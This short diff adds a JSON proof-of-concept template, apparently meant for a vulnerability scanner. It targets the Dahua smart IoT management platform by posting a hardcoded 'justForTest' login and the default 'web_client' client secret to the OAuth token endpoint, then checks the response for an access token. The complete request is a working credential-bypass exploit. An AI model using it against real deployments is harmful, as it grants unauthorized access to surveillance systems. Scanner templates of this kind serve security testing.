@@ -1,0 +1,18 @@
+{
+	"name":"大华智能物联综合管理平台justForTest用户登录",
+	"tag":"dahua",
+	"type":"other",
+	"poc":{
+		"pocGet":"/evo-apigw/evo-oauth/oauth/token",
+		"pocPost":"username=justForTest&password=1&grant_type=password&client_id=web_client&client_secret=web_client&public_key=",
+		"header":{
+			"User-Agent":" Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36",
+			"Connection":" close",
+			"Accept-Encoding":" gzip",
+			"Content-Length":" 109",
+			"Content-Type":" application/x-www-form-urlencoded"
+		},
+		"status_code":"200",
+		"pattern":"(access_token)"
+	}
+}
